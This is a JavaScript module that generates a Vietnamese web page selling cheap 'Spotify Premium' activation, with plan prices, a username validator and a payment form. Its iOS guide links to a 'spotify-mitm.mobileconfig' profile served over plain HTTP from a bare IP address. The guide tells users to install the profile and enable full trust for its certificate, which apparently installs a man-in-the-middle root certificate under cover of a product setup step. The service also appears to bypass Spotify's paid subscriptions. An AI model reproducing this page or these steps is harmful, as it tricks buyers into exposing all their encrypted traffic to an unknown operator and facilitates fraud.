export const SPOTIFY_PLANS = [
  { id: "spotify-1month", packageId: "1month", name: "1 tháng", price: 25000 },
  { id: "spotify-3month", packageId: "3month", name: "3 tháng", price: 75000 },
  { id: "spotify-6month", packageId: "6month", name: "6 tháng", price: 150000 },
  { id: "spotify-12month", packageId: "12month", name: "1 năm", price: 260000 },
];

export function spotifyUid(input) {
  if (typeof input !== "string" || input.length > 2048) return null;
  let value = input.trim();
  if (/^spotify:user:/i.test(value)) value = value.slice(13);
  else if (/^https?:\/\//i.test(value)) {
    try {
      const url = new URL(value);
      if (url.protocol !== "https:" || !["open.spotify.com", "play.spotify.com"].includes(url.hostname) || url.username || url.password) return null;
      const match = url.pathname.match(/^\/(?:intl-[a-z-]+\/)?user\/([^/]+)\/?$/i);
      if (!match) return null;
      value = decodeURIComponent(match[1]);
    } catch { return null; }
  }
  return /^[a-zA-Z0-9._-]{1,128}$/.test(value) ? value : null;
}

export function spotifyPage() {
  const money = value => new Intl.NumberFormat("vi-VN").format(value) + "đ";
  return `<section class="spotify-page"><div class="spotify-container">
    <header class="spotify-hero"><span class="spotify-eyebrow">♫ DỊCH VỤ SPOTIFY PREMIUM</span><h1>Kích hoạt Spotify Premium</h1><p>Nâng cấp trên tài khoản của bạn. Chỉ cần Username hoặc link hồ sơ, không cần chia sẻ mật khẩu.</p><div class="spotify-badges"><span>✓ Giữ nguyên playlist</span><span>✓ Tra cứu tự động</span><span>✓ Thanh toán qua ngân hàng</span></div></header>
    <div class="spotify-grid"><div class="spotify-column">
      <section class="spotify-card"><h2><span>1</span> Chọn gói đăng ký</h2><p>Chọn thời hạn phù hợp trước khi thanh toán.</p><fieldset class="spotify-plan-grid"><legend class="sr-only">Gói Spotify Premium</legend>${SPOTIFY_PLANS.map((plan, i) => `<label class="spotify-plan"><input type="radio" name="spotify-plan" value="${plan.id}" ${i ? "" : "checked"}><span><b>${plan.name}</b><strong>${money(plan.price)}</strong></span><i aria-hidden="true">✓</i></label>`).join("")}</fieldset></section>
      <section class="spotify-card"><h2><span>2</span> Tài khoản & thanh toán</h2><p>Nhập Spotify Username hoặc link hồ sơ của bạn.</p><form id="spotify-form"><label for="spotify-uid">Spotify UID / Username / Link hồ sơ</label><div class="spotify-input-row"><input id="spotify-uid" name="uid" maxlength="2048" autocomplete="off" autocapitalize="none" spellcheck="false" placeholder="https://open.spotify.com/user/…" required><button type="button" id="spotify-paste">Dán</button></div><p class="spotify-help">Trong Spotify: mở hồ sơ → Chia sẻ → Sao chép liên kết. Không dùng link bài hát hoặc playlist.</p><p id="spotify-lookup-status" role="status" aria-live="polite"></p><div id="spotify-profile" class="spotify-profile" hidden></div>
      <label for="spotify-coupon">Mã giảm giá <small>(nếu có)</small></label><div class="spotify-input-row"><input id="spotify-coupon" name="promo_code" maxlength="32" placeholder="Nhập mã giảm giá Spotify" autocomplete="off"><button type="button" id="spotify-apply">Áp dụng</button></div><p id="spotify-quote-status" role="status" aria-live="polite"></p>
      <dl class="spotify-summary"><div><dt>Gói đã chọn</dt><dd id="spotify-plan-name">1 tháng</dd></div><div><dt>Giá gói</dt><dd id="spotify-subtotal">25.000đ</dd></div><div><dt>Giảm giá</dt><dd id="spotify-discount">0đ</dd></div><div class="spotify-total"><dt>Thanh toán</dt><dd id="spotify-total">25.000đ</dd></div></dl><button class="spotify-pay" id="spotify-pay" type="submit" disabled>Thanh toán</button><p class="spotify-help">Thông tin chuyển khoản sẽ hiện sau khi tạo đơn. Kiểm tra đúng tài khoản trước khi thanh toán.</p><p id="spotify-submit-status" role="status" aria-live="polite"></p></form><div id="payment-result" class="payment-result" hidden></div></section>
    </div><div class="spotify-column">
      <section class="spotify-card"><h2>Hướng dẫn cài profile (iOS)</h2><p>Cài profile trên iPhone để sử dụng dịch vụ.</p><div class="spotify-profile-actions"><a id="spotify-profile-download" class="spotify-pay" href="http://103.101.161.228:8082/spotify-mitm.mobileconfig">Tải profile</a><button type="button" id="spotify-copy-profile">Chép link</button></div><ol class="spotify-steps"><li><b>Mở link bằng Safari</b><p>Bấm Tải profile và cho phép tải hồ sơ khi Safari hỏi.</p></li><li><b>Cài đặt profile</b><p>Vào Cài đặt → Đã tải về hồ sơ → Cài đặt. Nhập mật mã máy trên iPhone nếu được yêu cầu.</p></li><li><b>Bật tin cậy chứng chỉ</b><p>Vào Giới thiệu → Cài đặt tin cậy chứng chỉ → Bật Spotify.</p></li><li><b>Mở Spotify</b><p>Sau khi đơn báo hoàn tất, mở lại Spotify bằng đúng tài khoản đã thanh toán.</p></li></ol><p id="spotify-profile-status" class="spotify-help" role="status"></p></section>
    </div></div><section class="spotify-faq"><h2>Câu hỏi thường gặp về Spotify Premium</h2><div><article><h3>Có cần mật khẩu Spotify không?</h3><p>Không. Chỉ nhập Username hoặc link hồ sơ công khai để tra cứu tài khoản.</p></article><article><h3>Có mất playlist khi nâng cấp không?</h3><p>Dịch vụ sử dụng tài khoản bạn cung cấp. Hãy đối chiếu tên và avatar trước khi tạo đơn.</p></article><article><h3>Khi nào đơn được kích hoạt?</h3><p>Sau khi hệ thống xác nhận thanh toán, đơn chuyển sang xử lý. Trạng thái hoàn tất chỉ hiện khi nhà cung cấp xác nhận thành công.</p></article><article><h3>Mã giảm giá Locket có dùng được không?</h3><p>Mã ở trang này dành riêng cho Spotify. Liên hệ hỗ trợ nếu cần kiểm tra điều kiện áp dụng.</p></article></div></section>
  </div></section>`;
}
